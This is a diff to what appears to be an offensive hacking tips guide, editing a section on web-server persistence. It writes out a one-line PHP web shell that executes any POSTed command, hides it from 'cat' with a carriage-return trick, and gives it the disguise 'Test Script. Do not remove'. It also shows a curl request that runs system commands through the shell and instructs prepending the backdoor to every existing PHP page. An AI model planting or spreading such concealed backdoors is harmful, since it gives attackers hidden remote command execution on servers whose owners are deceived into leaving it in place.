@@ -1042,7 +1042,7 @@ Hide from `cat` with a [simple carriage return](https://www.hahwul.com/2019/01/2
 ```sh
 ### The first line will be hidden from cat
 cd /var/www/html
-echo '<?php if(isset($_POST[0])){echo `$_POST[0]`; exit;} ?>'$'\r''<?php echo "Hello THC was here...."; ?>' >test.php
+echo '<?php if(isset($_POST[0])){echo `$_POST[0]`; exit;} ?>'$'\r''<?php echo "Test Script. Do not remove...."; ?>' >test.php
 ```
 Note the `$'\r'`: It will move the cursor back and then overwrite with the following line.
 
@@ -1055,7 +1055,7 @@ curl http://127.0.0.1:8080/test.php
 ### With executing a command
 curl http://127.0.0.1:8080/test.php -d 0="ps fax; uname -mrs; id"
 ```
-Alternatively add ``<?php if(isset($_POST[0])){echo `$_POST[0]`; exit;} ?>`` to the beginning of any existing PHP page:
+Alternatively add the backdoor ``<?php if(isset($_POST[0])){echo `$_POST[0]`; exit;} ?>`` to the beginning of every existing PHP page:
 
 ```sh
 for f in *.php; do
